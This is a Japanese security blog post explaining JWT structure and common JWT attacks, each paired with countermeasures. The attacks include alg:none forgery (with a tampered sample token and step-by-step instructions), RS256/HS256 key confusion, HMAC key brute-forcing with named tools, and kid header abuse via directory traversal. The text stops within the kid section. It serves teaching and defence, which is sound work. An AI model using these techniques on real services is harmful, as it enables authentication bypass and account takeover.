---
Created: 2021-01-15T18:13:00
URL: https://scgajge12.hatenablog.com/entry/jwt_security
Tags: [topic/技術/セキュリティ]
---
![](https://cdn-ak.f.st-hatena.com/images/fotolife/s/scgajge12/20201207/20201207104729.png)

こんにちは、ISC 1年 IPFactory 所属の [morioka12](https://twitter.com/scgajge12) です。

この記事は [IPFactory Advent Calendar 2020 ](https://qiita.com/advent-calendar/2020/ipfactory)の10日目の分になります。

IPFactory という技術サークルについては、[こちら](https://ipfactory.github.io/)を参照ください。

> はてなブログに投稿しました \#はてなブログIPFactory Advent Calendar 2020 の10日目の記事を書きました#JWT \#securityセキュリティ視点からの JWT 入門 - blog of morioka12https://t.co/g1MYe77hAF
— morioka12 (@scgajge12) 2020年12月10日

普段は Web Security や Cloud Security 、バグバウンティなどを興味分野として勉強しながら、あるセキュリティベンダー企業で長期[インターンシップ](http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%BF%A1%BC%A5%F3%A5%B7%A5%C3%A5%D7)として[脆弱性](http://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)診断などをさせてもらっています。

今回は、最近多くの Web アプリケーションで使われている JWT について、基本的な概要とセキュリティ面に関する内容をまとめてみました。これから JWT を利用した Web 開発をする方や Web Security の学習をしている方、JWT というものを知りたい方などは、ぜひ少しでも参考にしてもらえると嬉しいです。

もし、本ブログの内容で間違いなのがあれば、[morioka12 (@scgajge12)](https://twitter.com/scgajge12)までご連絡いただければ幸いです。

### 目次

### 1. JWT ([JSON](http://d.hatena.ne.jp/keyword/JSON) Web Token) とは

[JSON](http://d.hatena.ne.jp/keyword/JSON) Web Token (JWT) とは、[RFC 7519](https://tools.ietf.org/html/rfc7519) で以下のように定義されています。

> JSON Web Token (JWT) is a compact, URL-safe means of representing claims to be transferred between two parties.

JWT は、二者間で転送されるクレーム(属性情報)を表現するためのコンパクトで URL Safe な方法です。

[Wikipedia](https://ja.wikipedia.org/wiki/JSON_Web_Token) には、以下のように記載されています。

> JSON Web Token（ジェイソン・ウェブ・トークン）は、JSONデータに署名や暗号化を施す方法を定めたオープン標準 (RFC 7519) である。略称はJWT。

簡単にいうと JWT (ジョット)は、ユーザー情報などを [JSON](https://www.json.org/json-ja.html) 形式で保持して、内容の改ざんを検知することができる[トーク](http://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF)ンです。

JWT に関連のある仕様は、以下になります。

- JWS ([JSON](http://d.hatena.ne.jp/keyword/JSON) Web Signature - [RFC 7515](https://tools.ietf.org/html/rfc7515))：署名付きのメッセージ表現
- JWE ([JSON](http://d.hatena.ne.jp/keyword/JSON) Web Encryption - [RFC 7516](https://tools.ietf.org/html/rfc7516))：暗号化のメッセージ表現
- JWK ([JSON](http://d.hatena.ne.jp/keyword/JSON) Web Key - [RFC 7517](https://tools.ietf.org/html/rfc7517))：暗号鍵の [JSON](http://d.hatena.ne.jp/keyword/JSON) 表現
- JWA ([JSON](http://d.hatena.ne.jp/keyword/JSON) Web Algorithms - [RFC 7518](https://tools.ietf.org/html/rfc7518))：JWS などで扱われる暗号[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)

ちなみに Web における[トーク](http://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF)ン (Token)とは、サーバーが必要とするクライアントの認証情報を含んだ文字列のことです。JWT の他にも [Access](http://d.hatena.ne.jp/keyword/Access) Token や ID Token 、Refresh Token などがあります。

最近の Web サイトや Web アプリケーションでは、多くの使い道で JWT が使用されています。(流行りの技術らしいです)

JWT は主に、以下のような特徴を持っています。

- 改ざんの検証をすることができる (一番の特徴だと思う)
- 実施あのデータが [JSON](http://d.hatena.ne.jp/keyword/JSON) 形式のオブジェクトである
- URL Safe である (URL に含まれるできる文字列のみで構成されている)
- コンパクトにやり取りを行うことができる

そして JWT は、以下のような機能や場面で使用されることが多いです。

- ログイン機能などの認証(Authentication)
- アクセス許可(Authorization)
- ユーザー情報の保持 (カート情報など)
- etc.

### 2. JWT の仕組み

基本的に JWT は、Header(ヘッダ)・Payload ([ペイロード](http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9))・Signature(署名)の3つの要素から構成されてる文字列となってます。各要素は、ドット(**.**)で結合されて1つの文字列として扱われます。

> <Header>.<Payload>.<Signature>

以下が JWT の例になります。

これを3つの要素がわかりやすいようにドットで改行をしてみます。

```plain text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Im1vcmlva2ExMiIsImlhdCI6MTUxNjIzOTAyMn0.
KmqetKpqEgjEHRvOrT8vEYdNQF_DI8FmB-vu5e_3Z0w
```

先程の説明でもあった通り JWT は、[JSON](http://d.hatena.ne.jp/keyword/JSON) 形式でデータを保持しています。でも実際は、ヘッダと[ペイロード](http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9)の情報は [Base64](http://d.hatena.ne.jp/keyword/Base64) URL [エンコード](http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9)された文字列で、署名の情報はヘッダに含まれる[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)とシークレットキー(鍵)により署名されたバイナリ文字列となってます。この形式は、よく使われている JWS (JWT Compact Serialization) という単一の署名を持つフォーマットになります。

JWT の内容をデコードすると、以下のように各要素の内容が分かる形となります。

`Headers = {
  "alg": "HS256",
  "typ": "JWT"
}

Payload = {
  "sub": "1234567890",
  "name": "morioka12",
  "iat": 1516239022
}

Signature = "KmqetKpqEgjEHRvOrT8vEYdNQF_DI8FmB-vu5e_3Z0w"`

各要素の中に定義されている項目のことをクレーム (Claim) といいます。クレームには、必須のものや任意のもの、独自に定義できるものがあります。そして各クレームに、保持させたい情報を入れて扱います。主に[ペイロード](http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9)の部分に重要なユーザー情報が格納されていることが多いです。次に各要素について説明していきます。

### 2.1. ヘッダデータ

ヘッダは、主にメタ情報となるものが含まれます。ヘッダで使われるクレームは、以下のようなものがあります。

- alg：署名の際に使用される[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)
- typ：[トーク](http://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF)ンのタイプ
- cty：[ペイロード](http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9)のメディアタイプ
- kid：Key ID

ヘッダで重要となっているのは、[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)を指定する alg クレームになります。これは先程示した通り、署名の生成や検証に使用されます。署名に使用できる[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)は、以下のようなものがあります。[RFC](http://d.hatena.ne.jp/keyword/RFC)-7518 の定義では、[こちら](https://tools.ietf.org/html/rfc7518#section-3.1)にあります。(xxx の部分は、256/384/512 のどれかになります)

- none：署名なし (No digital signature or [MAC](http://d.hatena.ne.jp/keyword/MAC) performed)
- HSxxx：[共通鍵暗号](https://ja.wikipedia.org/wiki/%E5%85%B1%E9%80%9A%E9%8D%B5%E6%9A%97%E5%8F%B7)方式 (HMAC using SHA-xxx)
- RSxxx：[公開鍵暗号](https://ja.wikipedia.org/wiki/%E5%85%AC%E9%96%8B%E9%8D%B5%E6%9A%97%E5%8F%B7)方式 (RSASSA-PKCS1-v1_5 using SHA-xxx)
- ESxxx：[楕円曲線暗号](https://ja.wikipedia.org/wiki/%E6%A5%95%E5%86%86%E6%9B%B2%E7%B7%9A%E6%9A%97%E5%8F%B7)方式 (ECDSA using P-xxx and SHA-xxx)
- PSxxx：[確率的署名方式](https://en.wikipedia.org/wiki/Probabilistic_signature_scheme) (RSASSA-[PSS](http://d.hatena.ne.jp/keyword/PSS) using SHA-xxx and MGF1 with SHA-xxx)

"none" は、署名を行わないため[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)を指定しないとします。"HSxxx" は、同一の鍵(共通鍵)で署名の生成や検証を行います。処理が速いのが特徴ですが、適切に鍵を安全に管理しなければなりません。"RSxxx" や "ESxxx" 、"PSxxx" は、署名の生成と検証に別々の鍵(公開鍵と[秘密鍵](http://d.hatena.ne.jp/keyword/%C8%EB%CC%A9%B8%B0))で行われます。

[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)に関しては、後にセキュリティリスクでも触れて特徴を説明します。

### 2.2. [ペイロード](http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9)データ

[ペイロード](http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9)は、実際に活用される情報が含まれます。[ペイロード](http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9)のクレームには、自由に項目を作れる独自のクレームと役割が決まっている予約済みのクレームがあります。[予約語](http://d.hatena.ne.jp/keyword/%CD%BD%CC%F3%B8%EC)は、有効期限や発行形態などに関する情報を保持するためのクレームとなってます。

予約済みのクレーム一覧 (役割)

クレーム
役割

[iss](http://d.hatena.ne.jp/keyword/iss)

JWTを発行した者(サーバー)の識別子


sub
JWTの主体となる識別子


aud
JWTを利用する側(クライアント)の識別子


exp
有効期限の終了日時


nbf
有効期限の開始日時


iat
発行日時


jti
一意な識別子


typ
コンテンツタイプの宣言

予約済みのクレームではないクレームは、パブリッククレームとプライベートクレームというものになります。RFC7519 には、[こちら](https://tools.ietf.org/html/rfc7519#section-10.1)に記載されていますが今回は詳しく説明しません。独自のクレームは、Web アプリケーションが[トーク](http://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF)ンとして保持させときたい情報を必要に応じてクレームを定義します。主にユーザーのメールアドレスやユーザーIDなどが含まれていることがあります。そのためユーザーに関する重要な情報が、[ペイロード](http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9)に含まれます。

### 2.3. 署名データ

署名は、JWT の改ざんを検証する際に使用されるデータ(文字列)になります。署名の文字列は、JWT のヘッダに付与されている[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)とシークレットキー(署名の際に使用される鍵)を利用して署名の文字列を生成します。生成した文字列は、"Signature" というクレームに含まれます。

### 2.4 JWT の生成と検証

では、実際に JWT が生成される流れと検証される流れを見てみます。

### 2.4.1 生成の流れ

1. ヘッダを生成
2. [ペイロード](http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9)を生成
3. 署名を生成する
4. 以上の3つをドット(.)で連結して完成

ヘッダと[ペイロード](http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9)は、データを [JSON](http://d.hatena.ne.jp/keyword/JSON) [エンコード](http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9)して [Base64](http://d.hatena.ne.jp/keyword/Base64) URL [エンコード](http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9)します。署名は、ヘッダにある[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)とシークレットキーを使用して文字列を生成します。その後に3つを連結して完成になります。

### 2.4.2. 検証の流れ

5. ヘッダを検証する
6. 署名を検証する
7. ([ペイロード](http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9)を検証する)

まずは、ヘッダを [Base64](http://d.hatena.ne.jp/keyword/Base64) URL デコードと[JSON](http://d.hatena.ne.jp/keyword/JSON) デコードをします。そして 以下のような検証をします。

- typ：期待する値と一致するか
- kid：サポートしている鍵なのか
- alg：kid クレームに紐づいた鍵と[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)が一致するか

ヘッダの検証が行われたら署名の検証をします。署名は、ヘッダに指定された kid に紐づく鍵で署名された文字列を HMAC-SHA256 などした値を [Base64](http://d.hatena.ne.jp/keyword/Base64) URL [エンコード](http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9)します。そして[エンコード](http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9)した文字列を比較して一致するかを検証します。[RSA](http://d.hatena.ne.jp/keyword/RSA) などの公開鍵方式の場合は、それ用の署名検証用関数を利用して検証を行います。

その後に必要に応じて[ペイロード](http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9)の検証もお願いします。これは利用場面によって検証すべきクレームが変わってくるので省略します。

ここまである程度、JWT について説明をしてきました。

JWT は、多くの Web アプリケーションで利用されています。標準化[プロトコル](http://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%C8%A5%B3%A5%EB)である [OAuth](https://tools.ietf.org/html/rfc6749#section-1.4) や [OpenID Connect](https://openid.net/developers/jwt/) 、[クラウド](http://d.hatena.ne.jp/keyword/%A5%AF%A5%E9%A5%A6%A5%C9)サービスである [AWS](https://docs.aws.amazon.com/ja_jp/cognito/latest/developerguide/amazon-cognito-user-pools-using-tokens-verifying-a-jwt.html) や [GCP](https://cloud.google.com/endpoints/docs/openapi/service-account-authentication) などでも使用されています。あと、学生なら最近よく使われている [ZoomのAPI](https://marketplace.zoom.us/docs/guides/auth/jwt)にもアカウント認証で使用されてます。なぜ JWT が多くの場面で使用されているかは、先程から色々示している標準化によってだと思われます。仕様は [RFC](http://d.hatena.ne.jp/keyword/RFC) で定義されて、各[プログラミング言語](http://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0%B8%C0%B8%EC)やライブラリが豊富になってきている点から多くの実装で利用されているのだと思います。

ローカルプロキシである Burp Suite などでリク[エス](http://d.hatena.ne.jp/keyword/%A5%A8%A5%B9)トを見たときに [Cookie](http://d.hatena.ne.jp/keyword/Cookie) やパラメータに **eyJ** から始まる長い文字列があった場合は、ぜひ デコードしてみてください。その eyJ は、**{** を[Base64](http://d.hatena.ne.jp/keyword/Base64) した文字列の可能性があるため JWT かもしれません。

> eyJ = Base64( ' { " ' )

JWT なら綺麗にデコードされて内容が見れると思います。この意識は、CTF の Web 問を解いている時もヒントに繋がるかもしれません。

CTF などで JWT のデコードして内容を見る場合は、オンライン上にある便利な [jwt.io](https://jwt.io/) を利用すると簡単に[エンコード](http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9)/デコードや生成/検証を行うことができます。

![](https://cdn-ak.f.st-hatena.com/images/fotolife/s/scgajge12/20201205/20201205011802.png)

ですが、実際の[脆弱性](http://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)診断などでは、JWT の情報は重要な内容なため Burp Suite の[拡張機能](http://d.hatena.ne.jp/keyword/%B3%C8%C4%A5%B5%A1%C7%BD)である[ JSON Web Tokens](https://portswigger.net/bappstore/f923cbf91698420890354c1d8958fee6) などを利用します。以下がその [JSON](http://d.hatena.ne.jp/keyword/JSON) Web Tokens で見たときの JWT になります。

![](https://cdn-ak.f.st-hatena.com/images/fotolife/s/scgajge12/20201207/20201207000915.png)

ちなみに、Burp Suite の[拡張機能](http://d.hatena.ne.jp/keyword/%B3%C8%C4%A5%B5%A1%C7%BD)で [JSON Web Token Attacker](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61) というものもあります。気になる方は、ぜひ詳細をご覧ください。

### 3. JWT のセキュリティリスク

ここからが本記事のメインになります。

JWT に関するセキュリティリスクは、主に JWT の実装方法に関連していることが多いです。一般的な JWT の[脆弱性](http://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)を突いた攻撃は、以下のようなものがあります。

- [アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)(alg)の操作
- 脆弱な HMAC 鍵を[ブルートフォース](http://d.hatena.ne.jp/keyword/%A5%D6%A5%EB%A1%BC%A5%C8%A5%D5%A5%A9%A1%BC%A5%B9)による特定
- 他の[脆弱性](http://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)を利用して[秘密鍵](http://d.hatena.ne.jp/keyword/%C8%EB%CC%A9%B8%B0)を特定
- Key ID (kid)の操作
- その他の攻撃や問題

各攻撃や問題について、少し細かく解説していきます。

### 3.1. [アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)(alg)の操作

これは、JWT のヘッダに含まれる[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)を操作することによって、サーバー側の検証を突破する攻撃方法です。

方法は主に2つあります。

- "alg:none" 攻撃
- RS256 公開鍵を HS256 の共通鍵として使用する攻撃

### 3.1.1. "alg:none" 攻撃

これは名前の通り、alg クレームを他指定されている[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)から none に改ざんして署名による検証を回避させる攻撃手法です。

手順としては、以下のようになります。

8. ヘッダの[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)を none に変更する
9. 署名の文字列を削除する
10. 改ざんした JWT をリク[エス](http://d.hatena.ne.jp/keyword/%A5%A8%A5%B9)トで送信して正常な動作をするか確認する
11. (成功している場合は、[ペイロード](http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9)の内容を自由に書き換えて悪用する)

もし none に改ざんしてリク[エス](http://d.hatena.ne.jp/keyword/%A5%A8%A5%B9)トで送信した際に、通常通りの動作をしたら改ざん成功です。これで[ペイロード](http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9)の内容を自由に改ざん(user を admin にするなど)して有効な JWT を生成することができることが確認できます。

```plain text
・元の JWT
　　eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQifQ.eyJmb28iOiJiYXIifQ.lmsUbhkgf5KpheRpXwc-pbG_HhYr9Grw1301d0sVzxI
　　　Header: {typ: "JWT", alg: "HS256", kid: "default"}
・改ざんした JWT
　　eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIiwia2lkIjoiZGVmYXVsdCJ9.eyJmb28iOiJiYXIifQ.
　　　Header: {typ: "JWT", alg: "none", kid: "default"}
```

この[脆弱性](http://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)は、サーバー側で[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)の制限を設定していない場合に起こります。対策としては、大体の Web アプリケーションでは想定している[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)が実装上で決まっていると思われます。そのため検証するサーバー側であらかじめ[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)を指定しておき、送られてきた JWT の[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)と一致しているかで判断するようにします。もしくは、JWT の検証を行う関数に事前に[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)を設定しておくという手もあります。

対策

- 検証を行うサーバー側であらかじめ[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)を指定しておく

これにより、"alg:none" 攻撃を回避することができます。

### 3.1.2. RS256 の公開鍵を HS256 の共通鍵として使用する攻撃

これは、RS256 の公開鍵/[秘密鍵](http://d.hatena.ne.jp/keyword/%C8%EB%CC%A9%B8%B0)と HS256 の共通鍵の特徴を悪用した攻撃手法です。これも先程の "alg:none" 攻撃と似た分類の攻撃手法になります。先程示した対策で、送られてきた JWT の検証を行う関数に [アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)の none を拒否するような実装をしている場合があります。その場合に、この攻撃手法で検証を回避することができること場合があります。

通常の RS256 の場合は、署名の生成に[秘密鍵](http://d.hatena.ne.jp/keyword/%C8%EB%CC%A9%B8%B0)を使用して、検証に公開鍵を使用します。そのため検証をするサーバー側には、署名の際に使用した[秘密鍵](http://d.hatena.ne.jp/keyword/%C8%EB%CC%A9%B8%B0)に紐づいた公開鍵があることになります。そして名前の通りに公開鍵は、[秘密鍵](http://d.hatena.ne.jp/keyword/%C8%EB%CC%A9%B8%B0)と違って公開状態となっています。なので攻撃者は、この公開鍵を入手することが可能です。その公開鍵を悪用して JWT の[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)を 同一の共通鍵で署名と検証をする HS256 に改ざんして指定します。そうすることで検証するサーバー側は、署名の[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)が HS256 であることを認識してサーバー側に元々ある公開鍵を使って署名検証します。これで HS256 で同一の鍵で生成されている JWT と判断されて突破することができます。

流れを整理すると、以下のようになります。

12. 対象の JWT の[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)が RS256 で、"alg:none" 攻撃は対策済みだったとする
13. 攻撃者は、対象の JWT で使用された[秘密鍵](http://d.hatena.ne.jp/keyword/%C8%EB%CC%A9%B8%B0)に紐づいた公開鍵を入手する
14. 対象の JWT の[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)を RS256 から HS256 に変更する
15. 先程の入手した公開鍵を利用して、署名の部分を生成する
16. 生成した署名を元の JWT の署名と入れ替えて、リク[エス](http://d.hatena.ne.jp/keyword/%A5%A8%A5%B9)トで送信して正常な動作をするか確認する
17. (成功している場合は、[ペイロード](http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9)の内容を自由に書き換えて悪用する)

この攻撃手法は、本記事の最後にある [おまけ(JWT の改ざん)](https://scgajge12.hatenablog.com/entry/jwt_security#5-%E3%81%8A%E3%81%BE%E3%81%91-JWT-%E3%81%AE%E6%94%B9%E3%81%96%E3%82%93) で簡単に [Python](http://d.hatena.ne.jp/keyword/Python) を使用して改ざんする手順を書きました。なので実際にこの攻撃手法を利用して JWT を改ざんしてみたい方は、ぜひ手元の環境で試してみてください。

この攻撃手法の対策としては先程と同じように、検証用の関数にあらかじめ[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)を厳密に指定しておくことで回避することができます。もし使用しているライブラリに関するに[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)を指定できるオプションない場合は、自分でヘッダの alg クレームを直接確認するようにするしかないです。

対策

- 検証を行うサーバー側であらかじめ[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)を厳密に指定しておく

これにより、RS256 の公開鍵を HS256 の共通鍵として使用する攻撃 を回避することができます。

### 3.2. 脆弱な HMAC 鍵を[ブルートフォース](http://d.hatena.ne.jp/keyword/%A5%D6%A5%EB%A1%BC%A5%C8%A5%D5%A5%A9%A1%BC%A5%B9)による特定

これは、JWT の署名の生成に使用される共通鍵が脆弱な(短い)文字列の場合に、その文字列を[ブルートフォース](http://d.hatena.ne.jp/keyword/%A5%D6%A5%EB%A1%BC%A5%C8%A5%D5%A5%A9%A1%BC%A5%B9)によって特定することで有効な JWT を生成することができる攻撃手法です。

元々 HMAC のような単一の鍵を使用する[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)は、署名と検証を早く実行できるというメリットがあります。速度を優先して効率よく実行することができますが、総当たり攻撃に対する耐性を考えたら、危険性が高まります。

実際に総当たりの[ブルートフォース](http://d.hatena.ne.jp/keyword/%A5%D6%A5%EB%A1%BC%A5%C8%A5%D5%A5%A9%A1%BC%A5%B9)を行う場合は、以下のようなツールを使用することで特定できたりします。本記事では、各ツールの詳細は省略します。(後に追記か別でまとめるかも)

- [jwt_tool](https://github.com/ticarpi/jwt_tool)
- [jwtcrack](https://github.com/Sjord/jwtcrack)
- [John the Ripper password cracker](https://www.openwall.com/john/)

対策としては、 単純に HMAC で使用する鍵の長さを長くすることになります。[RFC 7518 の3.2](https://tools.ietf.org/html/rfc7518#section-3.2) には以下のように記載されています。

> A key of the same size as the hash output (for instance, 256 bits for "HS256") or larger MUST be used with this algorithm.

ここの256ビットとは、ASCII 文字の32個に相当します。そのため、32文字を最小数として使用することがおすすめされています。

ただそれ以前に、一般的な総当たり攻撃の対策で一定以上のアクセス処理がされた場合に、アカウントロックのような機能を備えている場合もあります。そのため重要な情報を扱う場面では、別で対策を施しておいた方が無難だと思われます。

対策

- 256ビット以上の共通鍵を使用する
- 堅牢な[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)に変更する
- 重要な情報を扱うところは、アクセス制限を設ける
- HMAC の使用を避けて他の[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)で署名する

これにより、脆弱な HMAC 鍵を[ブルートフォース](http://d.hatena.ne.jp/keyword/%A5%D6%A5%EB%A1%BC%A5%C8%A5%D5%A5%A9%A1%BC%A5%B9)による特定を回避することができます。

### 3.3. 他の[脆弱性](http://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)を利用して[秘密鍵](http://d.hatena.ne.jp/keyword/%C8%EB%CC%A9%B8%B0)を特定

これは、一般的な[脆弱性](http://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)を介して[秘密鍵](http://d.hatena.ne.jp/keyword/%C8%EB%CC%A9%B8%B0)を特定して、有効な JWT を生成させる攻撃手法です。主に以下のような[脆弱性](http://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)で JWT に使用されたシークレットキーを入手することができます。

- [ディレクトリトラバーサル](http://d.hatena.ne.jp/keyword/%A5%C7%A5%A3%A5%EC%A5%AF%A5%C8%A5%EA%A5%C8%A5%E9%A5%D0%A1%BC%A5%B5%A5%EB)
- [SQL](http://d.hatena.ne.jp/keyword/SQL) インジェクション
- OS コマンドインジェクション
- XXE
- SSRF
- etc.

これらの[脆弱性](http://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)攻撃は、Web アプリケーションに対して攻撃して鍵の入手するか、JWT の内容(クレーム)を悪用して攻撃する方法があります。一般的な[脆弱性](http://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)攻撃の説明は、ここでは省略します。JWT の内容を悪用して攻撃する方法は、次に軽く説明します。

対策としては、一般的な[脆弱性](http://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)攻撃に対する対策を行うことでシークレットキーの入手を防ぐことができます。

ちなみに[ディレクトリトラバーサル](http://d.hatena.ne.jp/keyword/%A5%C7%A5%A3%A5%EC%A5%AF%A5%C8%A5%EA%A5%C8%A5%E9%A5%D0%A1%BC%A5%B5%A5%EB)を利用してシークレットキーを入手し、JWT の改ざんを行う手法は、所属している IPFactory が主催で開いた [ISCCTF2020](https://github.com/IPFactory/ISCCTF2020) の [[web(medium)] crackjwt](https://github.com/IPFactory/ISCCTF2020/tree/main/web/crackjwt) という CTF 問題で取り入れられています。気になる方は、ぜひ試してみてください。

### 3.4. Key ID (kid)の操作

これは、ヘッダに任意で付与される kid クレームを悪用することでシークレットキーを不正に入手することができる攻撃手法です。ちなみに kid クレームは、"Key ID" の略で、JWT の検証に使用する鍵を指定することができます。

例えば、JWT の検証に使用する鍵を1に指定する場合は、以下のようになります。

```plain text
{
 "alg" : "HS256",
 "typ" : "JWT",
 "kid" : "1"
}
```

kid クレームを悪用する方法は、以下のようにいくつかあります。

- kid クレームの情報を元に URL の[ディレクト](http://d.hatena.ne.jp/keyword/%A5%C7%A5%A3%A5%EC%A5%AF%A5%C8)リから調査する
- kid クレームに[ディレクトリトラバーサル](http://d.hatena.ne.jp/keyword/%A5%C7%A5%A3%A5%EC%A5%AF%A5%C8%A5%EA%A5%C8%A5%E9%A5%D0%A1%BC%A5%B5%A5%EB)の payload を埋め込む

### 3.4.1. kid クレームの情報を元に URL の[ディレクト](http://d.hatena.ne.jp/keyword/%A5%C7%A5%A3%A5%EC%A5%AF%A5%C8)リから調査する

これは、ヘッダに kid クレームが使用されている場合に、ファイル名やそのバリエーションを URL の[ディレクト](http://d.hatena.ne.jp/keyword/%A5%C7%A5%A3%A5%EC%A5%AF%A5%C8)リから直接的に調査します。もしかしたら、アクセスすることでシークレットキーを得れる可能性があります。

